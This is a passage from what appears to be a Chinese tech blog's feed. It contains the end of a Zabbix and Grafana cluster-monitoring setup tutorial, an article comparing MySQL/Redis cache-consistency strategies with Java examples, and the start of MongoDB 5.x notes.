class="line">enabled=1</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="3-2-安装Zabbix">3.2 安装Zabbix</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在hadoop102、hadoop103、hadoop104三台节点分别执行以下安装命令</span></span><br><span class="line">sudo yum install -y zabbix-server-mysql zabbix-agent zabbix-web-mysql-scl zabbix-apache-conf-scl</span><br><span class="line"><span class="comment"># hadoop103</span></span><br><span class="line">sudo yum install -y zabbix-agent</span><br><span class="line"><span class="comment"># hadoop104</span></span><br><span class="line">sudo yum install -y zabbix-agent</span><br></pre></td></tr></table></figure><h3 id="3-3-配置Zabbix">3.3 配置Zabbix</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建zabbix数据库</span></span><br><span class="line">mysql -uroot -p123456 -e<span class="string">"create database zabbix character set utf8 collate utf8_bin"</span></span><br><span class="line">zcat /usr/share/doc/zabbix-server-mysql*/create.sql.gz | mysql -uroot -p123456 zabbix</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置Zabbix_Server（hadoop102）</span></span><br><span class="line"><span class="comment"># 修改zabbix-server配置文件</span></span><br><span class="line">sudo vim /etc/zabbix/zabbix_server.conf</span><br><span class="line">DBHost=hadoop102</span><br><span class="line">DBName=zabbix</span><br><span class="line">DBUser=root</span><br><span class="line">DBPassword=123456</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置Zabbix_Agent（三台节点），server都写hadoop102</span></span><br><span class="line"><span class="comment"># 修改zabbix-agent配置文件</span></span><br><span class="line">sudo vim /etc/zabbix/zabbix_agentd.conf</span><br><span class="line"><span class="comment"># 修改如下内容：使用被动模式，等待proxy查询，而不是主动发送</span></span><br><span class="line">Server=hadoop102</span><br><span class="line"><span class="comment">#ServerActive=127.0.0.1</span></span><br><span class="line"><span class="comment">#Hostname=Zabbix server</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置Zabbix_Web时区,102</span></span><br><span class="line"><span class="comment"># 修改/etc/opt/rh/rh-php72/php-fpm.d/zabbix.conf文件</span></span><br><span class="line">sudo vim /etc/opt/rh/rh-php72/php-fpm.d/zabbix.conf</span><br><span class="line"><span class="comment"># 最后一行改</span></span><br><span class="line">php_value[date.timezone] = Asia/Shanghai</span><br></pre></td></tr></table></figure><h3 id="3-4-启动停止Zabbix">3.4 启动停止Zabbix</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 102启动与停止</span></span><br><span class="line">sudo systemctl start zabbix-server zabbix-agent httpd rh-php72-php-fpm</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> zabbix-server zabbix-agent httpd rh-php72-php-fpm</span><br><span class="line">sudo systemctl stop zabbix-server zabbix-agent httpd rh-php72-php-fpm</span><br><span class="line">sudo systemctl <span class="built_in">disable</span> zabbix-server zabbix-agent httpd rh-php72-php-fpm</span><br><span class="line"><span class="comment"># 103，104启动与停止</span></span><br><span class="line">sudo systemctl start zabbix-agent</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> zabbix-agent</span><br><span class="line">sudo systemctl stop zabbix-agent</span><br><span class="line">sudo systemctl <span class="built_in">disable</span> zabbix-agent</span><br></pre></td></tr></table></figure><p>然后连接Zabbix_Web数据库，浏览器访问<code>http://hadoop102/zabbix/</code>，然后按照步骤填写</p><p><img src="http://qnypic.shawncoding.top/blog/202312131435399.png" alt></p><p>最后登陆，用户名：Admin 密码：zabbix</p><h1>二、Zabbix的使用与集成</h1><h2 id="1、Zabbix常用术语">1、Zabbix常用术语</h2><ul><li><p>主机（Host）</p><p>一台你想监控的网络设备，用IP或域名表示</p></li><li><p>监控项（Item）</p><p>你想要接收的主机的特定数据，一个度量数据</p></li><li><p>触发器（Trigger）</p><p>一个被用于定义问题阈值和“评估”监控项接收到的数据的逻辑表达式</p></li><li><p>动作（Action）</p><p>一个对事件做出反应的预定义的操作，比如邮件通知</p></li></ul><h2 id="2、Zabbix实战">2、Zabbix实战</h2><h3 id="2-1-创建Host">2.1 创建Host</h3><ul><li>进入UI界面<strong>点击配置/主机/创建主机</strong></li><li><strong>配置主机（Host）</strong>，主机名称填写hadoop102，群组填写hadoop(自动新增)，填写agent所在ip，保存，<strong>重复以上步骤，再创建hadoop103、hadoop104主机</strong></li></ul><h3 id="2-2-创建监控项（Items）">2.2 创建监控项（Items）</h3><blockquote><p>文档资料：<a href="https://www.zabbix.com/documentation/5.0/zh/manual/config/items/itemtypes/zabbix_agent" target="_blank" rel="noopener" title="https://www.zabbix.com/documentation/5.0/zh/manual/config/items/itemtypes/zabbix_agent">https://www.zabbix.com/documentation/5.0/zh/manual/config/items/itemtypes/zabbix_agent</a></p></blockquote><p>在一台主机(例如hadoop102)<strong>点击监控项（Items）</strong>,<strong>点击创建监控项（Create Item）</strong>，<strong>配置监控项（Item）<strong>这里我以查询datanode的进程数为例，配置完成后即可</strong>查看监控项最新数据</strong></p><p><img src="http://qnypic.shawncoding.top/blog/202312131435400.png" alt></p><h3 id="2-3-创建触发器（Trigger）">2.3 创建触发器（Trigger）</h3><ul><li><strong>点击配置/主机/触发器</strong></li><li><strong>点击创建触发器，编辑触发器</strong></li></ul><p><img src="http://qnypic.shawncoding.top/blog/202312131435401.png" alt></p><h3 id="2-4-创建报警媒介类型（Media-type）">2.4 创建报警媒介类型（Media type）</h3><p><strong>点击管理/报警媒介类型/Email</strong>，编辑Email</p><p><img src="http://qnypic.shawncoding.top/blog/202312131435402.png" alt></p><p>然后在用户设置里<strong>Email绑定收件人</strong></p><h3 id="2-5-创建动作（Action）">2.5 创建动作（Action）</h3><p><strong>点击配置/动作/创建动作，编辑动作（Action）</strong></p><p><img src="http://qnypic.shawncoding.top/blog/202312131435403.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202312131435404.png" alt></p><h3 id="2-6-测试">2.6 测试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭集群中的HDFS，会有如下效果</span></span><br><span class="line">sbin/stop-dfs.sh</span><br><span class="line"><span class="comment"># 查看仪表盘与邮件</span></span><br></pre></td></tr></table></figure><h3 id="2-7-Zabbix模板创建">2.7 Zabbix模板创建</h3><p>里面可以发现有很多已经内置好的模板，可以直接拿来使用。如果要自己创建，点击配置/模板/创建模板，配置模板名称/群组，配置监控项，配置触发器；然后配置动作，将这几个触发器连接到动作。最后去主机为hadoop103应用模板</p><h2 id="3、集成Grafana入门">3、集成Grafana入门</h2><h3 id="3-1-部署Grafana">3.1 部署Grafana</h3><p>官方仓库：<a href="https://dl.grafana.com/oss/release/grafana-7.4.3-1.x86_64.rpm" target="_blank" rel="noopener" title="https://dl.grafana.com/oss/release/grafana-7.4.3-1.x86_64.rpm">https://dl.grafana.com/oss/release/grafana-7.4.3-1.x86_64.rpm</a></p><p>国内镜像：<a href="https://repo.huaweicloud.com/grafana/7.4.3/grafana-7.4.3-1.x86_64.rpm" target="_blank" rel="noopener" title="https://repo.huaweicloud.com/grafana/7.4.3/grafana-7.4.3-1.x86_64.rpm">https://repo.huaweicloud.com/grafana/7.4.3/grafana-7.4.3-1.x86_64.rpm</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://repo.huaweicloud.com/grafana/7.4.3/grafana-7.4.3-1.x86_64.rpm</span><br><span class="line"><span class="comment"># 使用rpm安装Grafana</span></span><br><span class="line">sudo rpm -ivh grafana-7.4.3-1.x86_64.rpm</span><br><span class="line"><span class="comment"># 启动Grafana</span></span><br><span class="line">sudo systemctl start grafana-server</span><br><span class="line"><span class="comment"># 访问地址为：http://hadoop102:3000/</span></span><br><span class="line"><span class="comment"># 首次登录用户名和密码均为 admin</span></span><br></pre></td></tr></table></figure><h3 id="3-2-集成Zabbix">3.2 集成Zabbix</h3><p>使用Grafana与其他系统集成时，需要配置对应的DataSource</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 搜索无法找到，需要先自行下载zabbix插件</span></span><br><span class="line"><span class="comment"># 拉到最下面或者访问：https://grafana.com/grafana/plugins/?utm_source=grafana_add_ds</span></span><br><span class="line"><span class="comment"># 按照所需插件的说明进行部署</span></span><br><span class="line">sudo grafana-cli plugins install alexanderzobnin-zabbix-app</span><br><span class="line">sudo systemctl restart grafana-server</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后点击plungin选择启动zabbix插件，之后数据源就可以找到该zabbix了</span></span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202312131435405.png" alt></p><p>下面举例一个集成案例，在Zabbix中为hadoop102主机应用一个Zabbix内置的Linux系统监控模板，选择主机hadoop102，点击模板，搜索linux，并选择Template OS Linux by Zabbix agent；下一步集成Grafana，展示模板中的系统监控项，选择要展示的监控项</p><p><img src="http://qnypic.shawncoding.top/blog/202312131435406.png" alt></p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;集群监控Zabbix和Prometheus&lt;/h1&gt;
&lt;h1&gt;一、Zabbix入门概述&lt;/h1&gt;
&lt;h2 id=&quot;1、Zabbix概述&quot;&gt;1、Zabbix概述&lt;/h2&gt;
&lt;p&gt;Zabbix是一款能够监控各种网络参数以及服务器健康性和完整性的软件。Zabbix使用灵活的通知机制，允许用户为几乎任何事件配置基于邮件的告警。这样可以快速反馈服务器的问题。基于已存储的数据，Zabbix提供了出色的报告和数据可视化功能&lt;/p&gt;</summary>
    
    
    
    <category term="云原生" scheme="https://blog.shawncoding.top/categories/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    
    
    <category term="运维相关" scheme="https://blog.shawncoding.top/tags/%E8%BF%90%E7%BB%B4%E7%9B%B8%E5%85%B3/"/>
    
  </entry>
  
  <entry>
    <title>缓存一致性几种解决方案</title>
    <link href="https://blog.shawncoding.top/posts/b38099cf.html"/>
    <id>https://blog.shawncoding.top/posts/b38099cf.html</id>
    <published>2023-12-13T08:39:14.000Z</published>
    <updated>2024-02-29T12:00:08.257Z</updated>
    
    <content type="html"><![CDATA[<h1>缓存一致性几种解决方案</h1><h1>一、理论知识</h1><h2 id="1、概述">1、概述</h2><p><img src="http://qnypic.shawncoding.top/blog/202312131431661.png" alt></p><a id="more"></a><h2 id="2、坏的方案">2、坏的方案</h2><h3 id="2-1-先写-MySQL，再写-Redis">2.1 先写 MySQL，再写 Redis</h3><p><img src="http://qnypic.shawncoding.top/blog/202312131431662.png" alt></p><p>图解说明：</p><ul><li>这是一副时序图，描述请求的先后调用顺序；</li><li>橘黄色的线是请求 A，黑色的线是请求 B；</li><li>橘黄色的文字，是 MySQL 和 Redis 最终不一致的数据；</li><li>数据是从 10 更新为 11；</li></ul><p>请求 A、B 都是先写 MySQL，然后再写 Redis，在高并发情况下，如果请求 A 在写 Redis 时卡了一会，请求 B 已经依次完成数据的更新，就会出现图中的问题。<strong>不过这里有个前提，就是对于读请求，先去读 Redis，如果没有，再去读 DB，但是读请求不会再回写 Redis。</strong> 大白话说一下，就是读请求不会更新 Redis</p><h3 id="2-2-先写-Redis，再写-MySQL">2.2 先写 Redis，再写 MySQL</h3><p><img src="http://qnypic.shawncoding.top/blog/202312131431663.png" alt></p><p>同“先写 MySQL，再写 Redis”</p><h3 id="2-3-先删除-Redis，再写-MySQL">2.3 先删除 Redis，再写 MySQL</h3><p>这幅图和上面有些不一样，前面的请求 A 和 B 都是更新请求，这里的请求 A 是更新请求，<strong>但是请求 B 是读请求，且请求 B 的读请求会回写 Redis</strong></p><p><img src="http://qnypic.shawncoding.top/blog/202312131431664.png" alt></p><p>请求 A 先删除缓存，可能因为卡顿，数据一直没有更新到 MySQL，导致两者数据不一致。<strong>这种情况出现的概率比较大，因为请求 A 更新 MySQL 可能耗时会比较长，而请求 B 的前两步都是查询，会非常快。</strong></p><h2 id="3、好的方案">3、好的方案</h2><h3 id="3-1-先删除-Redis，再写-MySQL，再删除-Redis">3.1 先删除 Redis，再写 MySQL，再删除 Redis</h3><p>对于“先删除 Redis，再写 MySQL”，如果要解决最后的不一致问题，其实再对 Redis 重新删除即可，<strong>这个也是大家常说的“缓存双删”</strong></p><p><img src="http://qnypic.shawncoding.top/blog/202312131431665.png" alt></p><p>为了便于大家看图，对于蓝色的文字，“删除缓存 10”必须在“回写缓存10”后面，那如何才能保证一定是在后面呢？**网上给出的第一个方案是，让请求 A 的最后一次删除，等待 500ms。**对于这种方案，看看就行，反正我是不会用，太 Low 了，风险也不可控。<strong>那有没有更好的方案呢，我建议异步串行化删除，即删除请求入队列</strong></p><p><img src="http://qnypic.shawncoding.top/blog/202312131431666.png" alt></p><p>异步删除对线上业务无影响，串行化处理保障并发情况下正确删除。如果双删失败怎么办，网上有给 Redis 加一个缓存过期时间的方案，这个不敢苟同。<strong>个人建议整个重试机制，可以借助消息队列的重试机制，也可以自己整个表，记录重试次数</strong>，方法很多</p><p>小结：</p><ul><li>“缓存双删”不要用无脑的 sleep 500 ms</li><li>通过消息队列的异步&amp;串行，实现最后一次缓存删除</li><li>缓存删除失败，增加重试机制</li></ul><h3 id="3-2-先写-MySQL，再删除-Redis">3.2 先写 MySQL，再删除 Redis</h3><p><img src="http://qnypic.shawncoding.top/blog/202312131431667.png" alt></p><p>对于上面这种情况，对于第一次查询，请求 B 查询的数据是 10，但是 MySQL 的数据是 11，<strong>只存在这一次不一致的情况，对于不是强一致性要求的业务，可以容忍。</strong>（那什么情况下不能容忍呢，比如秒杀业务、库存服务等。）当请求 B 进行第二次查询时，因为没有命中 Redis，会重新查一次 DB，然后再回写到 Reids</p><p><img src="http://qnypic.shawncoding.top/blog/202312131431668.png" alt></p><p>这里需要满足 2 个条件：</p><ul><li>缓存刚好自动失效；</li><li>请求 B 从数据库查出 10，回写缓存的耗时，比请求 A 写数据库，并且删除缓存的还长。</li></ul><p>对于第二个条件，我们都知道更新 DB 肯定比查询耗时要长，所以出现这个情况的概率很小，同时满足上述条件的情况更小。</p><h3 id="3-3-先写-MySQL，通过-Binlog，异步更新-Redis">3.3 先写 MySQL，通过 Binlog，异步更新 Redis</h3><p>这种方案，主要是监听 MySQL 的 Binlog，然后通过异步的方式，将数据更新到 Redis，这种方案有个前提，查询的请求，不会回写 Redis。</p><p><img src="http://qnypic.shawncoding.top/blog/202312131431669.png" alt></p><p>这个方案，会保证 MySQL 和 Redis 的最终一致性，但是如果中途请求 B 需要查询数据，如果缓存无数据，就直接查 DB；如果缓存有数据，查询的数据也会存在不一致的情况。<strong>所以这个方案，是实现最终一致性的终极解决方案，但是不能保证实时性。</strong></p><h2 id="4、几种方案比较">4、几种方案比较</h2><p>我们对比上面讨论的 6 种方案：</p><ul><li><p>先写 Redis，再写 MySQL</p><p><strong>这种方案，我肯定不会用</strong>，万一 DB 挂了，你把数据写到缓存，DB 无数据，这个是灾难性的；我之前也见同学这么用过，如果写 DB 失败，对 Redis 进行逆操作，那如果逆操作失败呢，是不是还要搞个重试？</p></li><li><p>先写 MySQL，再写 Redis</p><p><strong>对于并发量、一致性要求不高的项目，很多就是这么用的</strong>，我之前也经常这么搞，但是不建议这么做；当 Redis 瞬间不可用的情况，需要报警出来，然后线下处理。</p></li><li><p>先删除 Redis，再写 MySQL</p><p>这种方式，我还真没用过，<strong>直接忽略吧。</strong></p></li><li><p>先删除 Redis，再写 MySQL，再删除 Redis</p><p>这种方式虽然可行，但是<strong>感觉好复杂</strong>，还要搞个消息队列去异步删除 Redis。</p></li><li><p>先写 MySQL，再删除 Redis</p><p><strong>比较推荐这种方式</strong>，删除 Redis 如果失败，可以再多重试几次，否则报警出来；这个方案，是实时性中最好的方案，在一些高并发场景中，推荐这种。</p></li><li><p>先写 MySQL，通过 Binlog，异步更新 Redis</p><p><strong>对于异地容灾、数据汇总等，建议会用这种方式</strong>，比如 binlog + kafka，数据的一致性也可以达到秒级；纯粹的高并发场景，不建议用这种方案，比如抢购、秒杀等。</p></li></ul><p><strong>个人结论：</strong></p><ul><li><strong>实时一致性方案</strong>：采用“先写 MySQL，再删除 Redis”的策略，这种情况虽然也会存在两者不一致，但是需要满足的条件有点苛刻，<strong>所以是满足实时性条件下，能尽量满足一致性的最优解。</strong></li><li><strong>最终一致性方案</strong>：采用“先写 MySQL，通过 Binlog，异步更新 Redis”，可以通过 Binlog，结合消息队列异步更新 Redis，<strong>是最终一致性的最优解。</strong></li></ul><h1>二、项目实战</h1><h2 id="1、数据更新">1、数据更新</h2><p>因为项目对实时性要求高，所以采用方案 5，先写 MySQL，再删除 Redis 的方式。下面只是一个示例，我们将文章的标签放入 MySQL 之后，再删除 Redis，所有涉及到 DB 更新的操作都需要按照这种方式处理。这里加了一个事务，如果 Redis 删除失败，MySQL 的更新操作也需要回滚，避免查询时读取到脏数据。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Transactional</span>(rollbackFor = Exception<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">void</span> <span class="title">saveTag</span>(<span class="title">TagReq</span> <span class="title">tagReq</span>) </span>&#123;</span><br><span class="line">    TagDO tagDO = ArticleConverter.toDO(tagReq);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 先写 MySQL</span></span><br><span class="line">    <span class="keyword">if</span> (NumUtil.nullOrZero(tagReq.getTagId())) &#123;</span><br><span class="line">        tagDao.save(tagDO);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        tagDO.setId(tagReq.getTagId());</span><br><span class="line">        tagDao.updateById(tagDO);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 再删除 Redis</span></span><br><span class="line">    String redisKey = CACHE_TAG_PRE + tagDO.getId();</span><br><span class="line">    RedisClient.del(redisKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Transactional</span>(rollbackFor = Exception<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">void</span> <span class="title">deleteTag</span>(<span class="title">Integer</span> <span class="title">tagId</span>) </span>&#123;</span><br><span class="line">    TagDO tagDO = tagDao.getById(tagId);</span><br><span class="line">    <span class="keyword">if</span> (tagDO != <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="comment">// 先写 MySQL</span></span><br><span class="line">        tagDao.removeById(tagId);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 再删除 Redis</span></span><br><span class="line">        String redisKey = CACHE_TAG_PRE + tagDO.getId();</span><br><span class="line">        RedisClient.del(redisKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">operateTag</span><span class="params">(Integer tagId, Integer pushStatus)</span> </span>&#123;</span><br><span class="line">    TagDO tagDO = tagDao.getById(tagId);</span><br><span class="line">    <span class="keyword">if</span> (tagDO != <span class="keyword">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 先写 MySQL</span></span><br><span class="line">        tagDO.setStatus(pushStatus);</span><br><span class="line">        tagDao.updateById(tagDO);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 再删除 Redis</span></span><br><span class="line">        String redisKey = CACHE_TAG_PRE + tagDO.getId();</span><br><span class="line">        RedisClient.del(redisKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2、数据获取">2、数据获取</h2><p>这个也很简单，先查询缓存，如果有就直接返回；如果未查询到，需要先查询 DB ，再写入缓存。我们放入缓存时，加了一个过期时间，用于兜底，万一两者不一致，缓存过期后，数据会重新更新到缓存。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> TagDTO <span class="title">getTagById</span><span class="params">(Long tagId)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    String redisKey = CACHE_TAG_PRE + tagId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 先查询缓存，如果有就直接返回</span></span><br><span class="line">    String tagInfoStr = RedisClient.getStr(redisKey);</span><br><span class="line">    <span class="keyword">if</span> (tagInfoStr != <span class="keyword">null</span> &amp;&amp; !tagInfoStr.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> JsonUtil.toObj(tagInfoStr, TagDTO<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果未查询到，需要先查询 DB ，再写入缓存</span></span><br><span class="line">    TagDTO tagDTO = tagDao.selectById(tagId);</span><br><span class="line">    tagInfoStr = JsonUtil.toStr(tagDTO);</span><br><span class="line">    RedisClient.setStrWithExpire(redisKey, tagInfoStr, CACHE_TAG_EXPRIE_TIME);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tagDTO;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3、测试用例">3、测试用例</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Louzai</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2023/5/5</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MysqlRedisService</span> <span class="keyword">extends</span> <span class="title">BasicTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> TagSettingService tagSettingService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        TagReq tagReq = <span class="keyword">new</span> TagReq();</span><br><span class="line">        tagReq.setTag(<span class="string">"Java"</span>);</span><br><span class="line">        tagReq.setTagId(<span class="number">1L</span>);</span><br><span class="line">        tagSettingService.saveTag(tagReq);</span><br><span class="line">        log.info(<span class="string">"save success:&#123;&#125;"</span>, tagReq);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        TagDTO tagDTO = tagSettingService.getTagById(<span class="number">1L</span>);</span><br><span class="line">        log.info(<span class="string">"query tagInfo:&#123;&#125;"</span>, tagDTO);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>redis结果为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; get pai_cache_tag_pre_1</span><br><span class="line"><span class="string">"&#123;\"tagId\":1,\"tag\":\"Java\",\"status\":1,\"selected\":null&#125;"</span></span><br></pre></td></tr></table></figure><hr><p>参考文章：</p><p><a href="https://paicoding.com/article/detail/319" target="_blank" rel="noopener" title="技术派中的缓存一致性解决方案">技术派中的缓存一致性解决方案</a></p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;缓存一致性几种解决方案&lt;/h1&gt;
&lt;h1&gt;一、理论知识&lt;/h1&gt;
&lt;h2 id=&quot;1、概述&quot;&gt;1、概述&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;http://qnypic.shawncoding.top/blog/202312131431661.png&quot; alt&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://blog.shawncoding.top/categories/Java/"/>
    
    
    <category term="SpringBoot" scheme="https://blog.shawncoding.top/tags/SpringBoot/"/>
    
  </entry>
  
  <entry>
    <title>MongoDB5.x学习笔记</title>
    <link href="https://blog.shawncoding.top/posts/5022d515.html"/>
    <id>https://blog.shawncoding.top/posts/5022d515.html</id>
    <published>2023-12-13T08:39:04.000Z</published>
    <updated>2024-02-29T12:00:08.267Z</updated>
    
    <content type="html"><![CDATA[<h1>MongoDB5.x学习笔记</h1><h1>一、概述</h1><blockquote><p>官方文档：<a href="https://www.mongodb.com/docs/manual/" target="_blank" rel="noopener" title="https://www.mongodb.com/docs/manual/">https://www.mongodb.com/docs/manual/</a><br>菜鸟教程：<a href="https://www.runoob.com/mongodb/mongodb-tutorial.html" target="_blank" rel="noopener" title="https://www.runoob.com/mongodb/mongodb-tutorial.html">https://www.runoob.com/mongodb/mongodb-tutorial.html</a></p></blockquote><h2 id="1、MongoDB简介">1、MongoDB简介</h2><h3 id="1-1-简介">1.1 简介</h3><p>MongoDB是一个基于分布式文件存储的数据库（支持集群、分片处理）。由C++语言编写。旨在为WEB应用提供可扩展高性能的数据存储解决方案。</p><a id="more"></a><p>MongoDB是一个介于关系数据库和非关系数据库之间的产品（偏向于非关系型数据库NoSQL），是非关系数据库当中功能最丰富，最像关系数据库的。它支持的数据结构非常松散，是类似json的bson格式（对json进行扩展），因此可以存储比较复杂的数据类型。MongoDB最大的特点是它支持的查询语言非常强大，其语法有点类似于面向对象的查询语言，几乎可以实现类似关系数据库单表查询的绝大部分功能，而且还支持对数据建立索引。</p><p><strong>总结: mongoDB是一个非关系型文档数据库</strong></p><h3 id="1-2-发展历史">1.2 发展历史</h3><ul><li>2009年2月，MongoDB数据库首次在数据库领域亮相，打破了关系型数据库一统天下的局面；</li><li>2010年8月, MongoDB 1.6发布。这个版本最大的一个功能就是Sharding—自动分片；</li><li>2014年12月, MongoDB 3.0发布。由于收购了WiredTiger 存储引擎，大幅提升了MongoDB的写入性能；</li><li>2015年12月，3.2版本发布，开始支持了关系型数据库的核心功能：关联。你可以一次同时查询多个MongoDB的集合。</li><li>2016年, MongoDB推出Atlas，在AWS、 Azure 和GCP上的MongoDB托管服务；</li><li>2017年10月，MongoDB成功在纳斯达克敲钟，成为26年来第一家以数据库产品为主要业务的上市公司。</li><li>2018年6月, MongoDB4.0 